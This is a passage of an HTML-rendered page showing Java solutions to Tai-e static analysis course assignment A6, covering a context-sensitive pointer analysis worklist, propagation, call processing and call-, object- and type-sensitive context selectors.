keyword">this</span><span class="token punctuation">.</span>context<span class="token punctuation">,</span>stmt<span class="token punctuation">)</span><span class="token punctuation">,</span>                            csMethod<span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">addReachable</span><span class="token punctuation">(</span>csMethod<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">pass</span><span class="token punctuation">(</span>csManager<span class="token punctuation">.</span><span class="token function">getCSCallSite</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>context<span class="token punctuation">,</span>stmt<span class="token punctuation">)</span><span class="token punctuation">,</span>csMethod<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">CSObj</span> csObj <span class="token operator">=</span> csManager<span class="token punctuation">.</span><span class="token function">getCSObj</span><span class="token punctuation">(</span>contextSelector<span class="token punctuation">.</span><span class="token function">selectHeapContext</span><span class="token punctuation">(</span>csMethod<span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    workList<span class="token punctuation">.</span><span class="token function">addEntry</span><span class="token punctuation">(</span>            csManager<span class="token punctuation">.</span><span class="token function">getCSVar</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span>stmt<span class="token punctuation">.</span><span class="token function">getLValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token class-name">PointsToSetFactory</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span>csObj<span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">addPFGEdge</span><span class="token punctuation">(</span><span class="token class-name">Pointer</span> source<span class="token punctuation">,</span> <span class="token class-name">Pointer</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// TODO - check</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pointerFlowGraph<span class="token punctuation">.</span><span class="token function">addEdge</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>source<span class="token punctuation">.</span><span class="token function">getPointsToSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            workList<span class="token punctuation">.</span><span class="token function">addEntry</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> source<span class="token punctuation">.</span><span class="token function">getPointsToSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>         <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">analyze</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// TODO - check</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>workList<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">WorkList<span class="token punctuation">.</span>Entry</span> entry <span class="token operator">=</span> workList<span class="token punctuation">.</span><span class="token function">pollEntry</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Pointer</span> ptr <span class="token operator">=</span> entry<span class="token punctuation">.</span><span class="token function">pointer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">PointsToSet</span> delta <span class="token operator">=</span> <span class="token function">propagate</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> entry<span class="token punctuation">.</span><span class="token function">pointsToSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr <span class="token keyword">instanceof</span> <span class="token class-name">CSVar</span> varPtr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Context</span> context <span class="token operator">=</span> varPtr<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Var</span> x <span class="token operator">=</span> varPtr<span class="token punctuation">.</span><span class="token function">getVar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">CSObj</span> obj <span class="token operator">:</span> delta<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// x.f = y</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">StoreField</span> storeField <span class="token operator">:</span> x<span class="token punctuation">.</span><span class="token function">getStoreFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token function">addPFGEdge</span><span class="token punctuation">(</span>                            csManager<span class="token punctuation">.</span><span class="token function">getCSVar</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span>storeField<span class="token punctuation">.</span><span class="token function">getRValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                            csManager<span class="token punctuation">.</span><span class="token function">getInstanceField</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span>storeField<span class="token punctuation">.</span><span class="token function">getFieldRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token comment">// y = x.f</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">LoadField</span> loadField <span class="token operator">:</span> x<span class="token punctuation">.</span><span class="token function">getLoadFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token function">addPFGEdge</span><span class="token punctuation">(</span>                            csManager<span class="token punctuation">.</span><span class="token function">getInstanceField</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span>loadField<span class="token punctuation">.</span><span class="token function">getFieldRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                            csManager<span class="token punctuation">.</span><span class="token function">getCSVar</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span>loadField<span class="token punctuation">.</span><span class="token function">getLValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token comment">// arr[*] = y</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">StoreArray</span> storeArray <span class="token operator">:</span> x<span class="token punctuation">.</span><span class="token function">getStoreArrays</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token function">addPFGEdge</span><span class="token punctuation">(</span>                            csManager<span class="token punctuation">.</span><span class="token function">getCSVar</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span>storeArray<span class="token punctuation">.</span><span class="token function">getRValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                            csManager<span class="token punctuation">.</span><span class="token function">getArrayIndex</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>                    <span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token comment">// y = arr[*]</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">LoadArray</span> loadArray <span class="token operator">:</span> x<span class="token punctuation">.</span><span class="token function">getLoadArrays</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token function">addPFGEdge</span><span class="token punctuation">(</span>                            csManager<span class="token punctuation">.</span><span class="token function">getArrayIndex</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">,</span>                            csManager<span class="token punctuation">.</span><span class="token function">getCSVar</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span>loadArray<span class="token punctuation">.</span><span class="token function">getLValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token function">processCall</span><span class="token punctuation">(</span>varPtr<span class="token punctuation">,</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>   <span class="token comment">/** * Propagates pointsToSet to pt(pointer) and its PFG successors, * returns the difference set of pointsToSet and pt(pointer). */</span><span class="token keyword">private</span> <span class="token class-name">PointsToSet</span> <span class="token function">propagate</span><span class="token punctuation">(</span><span class="token class-name">Pointer</span> pointer<span class="token punctuation">,</span> <span class="token class-name">PointsToSet</span> pointsToSet<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// TODO - check</span>    <span class="token class-name">PointsToSet</span> delta <span class="token operator">=</span> <span class="token class-name">PointsToSetFactory</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">PointsToSet</span> has <span class="token operator">=</span> pointer<span class="token punctuation">.</span><span class="token function">getPointsToSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       pointsToSet<span class="token punctuation">.</span><span class="token function">objects</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>            <span class="token function">filter</span><span class="token punctuation">(</span>ptr <span class="token operator">-></span> <span class="token operator">!</span>has<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>            <span class="token function">forEach</span><span class="token punctuation">(</span>ptr <span class="token operator">-></span> <span class="token punctuation">&#123;</span>has<span class="token punctuation">.</span><span class="token function">addObject</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>delta<span class="token punctuation">.</span><span class="token function">addObject</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>delta<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        pointerFlowGraph<span class="token punctuation">.</span><span class="token function">getSuccsOf</span><span class="token punctuation">(</span>pointer<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>succ <span class="token operator">-></span> workList<span class="token punctuation">.</span><span class="token function">addEntry</span><span class="token punctuation">(</span>succ<span class="token punctuation">,</span>delta<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> delta<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span class="token comment">/** * Processes instance calls when points-to set of the receiver variable changes. * * @param recv    the receiver variable * @param recvObj set of new discovered objects pointed by the variable. */</span><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">processCall</span><span class="token punctuation">(</span><span class="token class-name">CSVar</span> recv<span class="token punctuation">,</span> <span class="token class-name">CSObj</span> recvObj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// TODO - check</span>    <span class="token class-name">Context</span> c <span class="token operator">=</span> recv<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Var</span> <span class="token keyword">var</span> <span class="token operator">=</span> recv<span class="token punctuation">.</span><span class="token function">getVar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Invoke</span> callSite <span class="token operator">:</span> <span class="token keyword">var</span><span class="token punctuation">.</span><span class="token function">getInvokes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">JMethod</span> callee <span class="token operator">=</span> <span class="token function">resolveCallee</span><span class="token punctuation">(</span>recvObj<span class="token punctuation">,</span> callSite<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">CSCallSite</span> csCallSite <span class="token operator">=</span> csManager<span class="token punctuation">.</span><span class="token function">getCSCallSite</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> callSite<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">Context</span> ct <span class="token operator">=</span> contextSelector<span class="token punctuation">.</span><span class="token function">selectContext</span><span class="token punctuation">(</span>csCallSite<span class="token punctuation">,</span> recvObj<span class="token punctuation">,</span> callee<span class="token punctuation">)</span><span class="token punctuation">;</span>        workList<span class="token punctuation">.</span><span class="token function">addEntry</span><span class="token punctuation">(</span>csManager<span class="token punctuation">.</span><span class="token function">getCSVar</span><span class="token punctuation">(</span>ct<span class="token punctuation">,</span>callee<span class="token punctuation">.</span><span class="token function">getIR</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getThis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token class-name">PointsToSetFactory</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span>recvObj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">CSMethod</span> csCallee <span class="token operator">=</span> csManager<span class="token punctuation">.</span><span class="token function">getCSMethod</span><span class="token punctuation">(</span>ct<span class="token punctuation">,</span> callee<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>callGraph<span class="token punctuation">.</span><span class="token function">addEdge</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Edge</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token class-name">CallGraphs</span><span class="token punctuation">.</span><span class="token function">getCallKind</span><span class="token punctuation">(</span>callSite<span class="token punctuation">)</span><span class="token punctuation">,</span>csCallSite<span class="token punctuation">,</span>csCallee<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">addReachable</span><span class="token punctuation">(</span>csCallee<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">pass</span><span class="token punctuation">(</span>csCallSite<span class="token punctuation">,</span>csCallee<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p><code>Tai-e-assignments-wp/A6/_1CallSelector.java</code></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Context</span> <span class="token function">selectContext</span><span class="token punctuation">(</span><span class="token class-name">CSCallSite</span> callSite<span class="token punctuation">,</span> <span class="token class-name">JMethod</span> callee<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token comment">// TODO - check</span>     <span class="token keyword">return</span> <span class="token class-name">ListContext</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span>callSite<span class="token punctuation">.</span><span class="token function">getCallSite</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span> <span class="token keyword">public</span> <span class="token class-name">Context</span> <span class="token function">selectContext</span><span class="token punctuation">(</span><span class="token class-name">CSCallSite</span> callSite<span class="token punctuation">,</span> <span class="token class-name">CSObj</span> recv<span class="token punctuation">,</span> <span class="token class-name">JMethod</span> callee<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token comment">// TODO - check</span>     <span class="token keyword">return</span> <span class="token class-name">ListContext</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span>callSite<span class="token punctuation">.</span><span class="token function">getCallSite</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span> <span class="token keyword">public</span> <span class="token class-name">Context</span> <span class="token function">selectHeapContext</span><span class="token punctuation">(</span><span class="token class-name">CSMethod</span> method<span class="token punctuation">,</span> <span class="token class-name">Obj</span> obj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token comment">// TODO - check</span>     <span class="token keyword">return</span> <span class="token function">getEmptyContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span></code></pre></li><li><p><code>Tai-e-assignments-wp/A6/_1ObjSelector.java</code></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Context</span> <span class="token function">selectContext</span><span class="token punctuation">(</span><span class="token class-name">CSCallSite</span> callSite<span class="token punctuation">,</span> <span class="token class-name">JMethod</span> callee<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// TODO - check</span>    <span class="token keyword">return</span> <span class="token function">getEmptyContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">Context</span> <span class="token function">selectContext</span><span class="token punctuation">(</span><span class="token class-name">CSCallSite</span> callSite<span class="token punctuation">,</span> <span class="token class-name">CSObj</span> recv<span class="token punctuation">,</span> <span class="token class-name">JMethod</span> callee<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// TODO - check</span>    <span class="token keyword">return</span> <span class="token class-name">ListContext</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span>recv<span class="token punctuation">.</span><span class="token function">getObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">Context</span> <span class="token function">selectHeapContext</span><span class="token punctuation">(</span><span class="token class-name">CSMethod</span> method<span class="token punctuation">,</span> <span class="token class-name">Obj</span> obj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// TODO - check</span>    <span class="token keyword">return</span> <span class="token function">getEmptyContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p><code>Tai-e-assignments-wp/A6/_1TypeSelector.java</code></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Context</span> <span class="token function">selectContext</span><span class="token punctuation">(</span><span class="token class-name">CSCallSite</span> callSite<span class="token punctuation">,</span> <span class="token class-name">JMethod</span> callee<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// TODO - check</span>    <span class="token keyword">return</span> callSite<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">Context</span> <span class="token function">selectContext</span><span class="token punctuation">(</span><span class="token class-name">CSCallSite</span> callSite<span class="token punctuation">,</span> <span class="token class-name">CSObj</span> recv<span class="token punctuation">,</span> <span class="token class-name">JMethod</span> callee<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// TODO - check</span>    <span class="token keyword">return</span> <span class="token class-name">ListContext</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span>recv<span class="token punctuation">.</span><span class="token function">getObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContainerType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">Context</span> <span class="token function">selectHeapContext</span><span class="token punctuation">(</span><span class="token class-name">CSMethod</span> method<span class="token punctuation">,</span> <span class="token class-name">Obj</span> obj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// TODO - check</span>    <span class="token keyword">return</span> <span class="token function">getEmptyContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p><code>Tai-e-assignments-wp/A6/_2CallSelector.java</code></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Context</span> <span class="token function">selectContext</span><span class="token punctuation">(</span><span class="token class-name">CSCallSite</span> callSite<span class="token punctuation">,</span> <span class="token class-name">JMethod</span> callee<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token comment">// TODO - check</span>     <span class="token class-name">Context</span> oldContext <span class="token operator">=</span> callSite<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>oldContext<span class="token punctuation">.</span><span class="token function">getLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">return</span> <span class="token class-name">ListContext</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span>oldContext<span class="token punctuation">.</span><span class="token function">getElementAt</span><span class="token punctuation">(</span>oldContext<span class="token punctuation">.</span><span class="token function">getLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>callSite<span class="token punctuation">.</span><span class="token function">getCallSite</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>     <span class="token keyword">return</span> <span class="token class-name">ListContext</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span>callSite<span class="token punctuation">.</span><span class="token function">getCallSite</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span> <span class="token keyword">public</span> <span class="token class-name">Context</span> <span class="token function">selectContext</span><span class="token punctuation">(</span><span class="token class-name">CSCallSite</span> callSite<span class="token punctuation">,</span> <span class="token class-name">CSObj</span> recv<span class="token punctuation">,</span> <span class="token class-name">JMethod</span> callee<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token comment">// TODO - check</span>     <span class="token keyword">return</span> <span class="token function">selectContext</span><span class="token punctuation">(</span>callSite<span class="token punctuation">,</span>callee<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span> <span class="token keyword">public</span> <span class="token class-name">Context</span> <span class="token function">selectHeapContext</span><span class="token punctuation">(</span><span class="token class-name">CSMethod</span> method<span class="token punctuation">,</span> <span class="token class-name">Obj</span> obj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token comment">// TODO - check</span>     <span class="token class-name">Context</span> oldContext <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>oldContext<span class="token punctuation">.</span><span class="token function">getLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">return</span> <span class="token class-name">ListContext</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span>oldContext<span class="token punctuation">.</span><span class="token function">getElementAt</span><span class="token punctuation">(</span>oldContext<span class="token punctuation">.</span><span class="token function">getLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>     <span class="token keyword">return</span> oldContext<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span></code></pre></li><li><p><code>Tai-e-assignments-wp/A6/_2ObjSelector.java</code></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Context</span> <span class="token function">selectContext</span><span class="token punctuation">(</span><span class="token class-name">CSCallSite</span> callSite<span class="token punctuation">,</span> <span class="token class-name">JMethod</span> callee<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// TODO - check</span>    <span class="token keyword">return</span> callSite<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">Context</span> <span class="token function">selectContext</span><span class="token punctuation">(</span><span class="token class-name">CSCallSite</span> callSite<span class="token punctuation">,</span> <span class="token class-name">CSObj</span> recv<span class="token punctuation">,</span> <span class="token class-name">JMethod</span> callee<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// TODO - check</span>    <span class="token class-name">Context</span> oldContext <span class="token operator">=</span> recv<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>oldContext<span class="token punctuation">.</span><span class="token function">getLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">ListContext</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span>oldContext<span class="token punctuation">.</span><span class="token function">getElementAt</span><span class="token punctuation">(</span>oldContext<span class="token punctuation">.</span><span class="token function">getLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>recv<span class="token punctuation">.</span><span class="token function">getObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token class-name">ListContext</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span>recv<span class="token punctuation">.</span><span class="token function">getObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">Context</span> <span class="token function">selectHeapContext</span><span class="token punctuation">(</span><span class="token class-name">CSMethod</span> method<span class="token punctuation">,</span> <span class="token class-name">Obj</span> obj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// TODO - check</span>    <span class="token class-name">Context</span> oldContext <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>oldContext<span class="token punctuation">.</span><span class="token function">getLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">ListContext</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span>oldContext<span class="token punctuation">.</span><span class="token function">getElementAt</span><span class="token punctuation">(</span>oldContext<span class="token punctuation">.</span><span class="token function">getLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> oldContext<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p><code>Tai-e-assignments-wp/A6/_2TypeSelector.java</code></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token 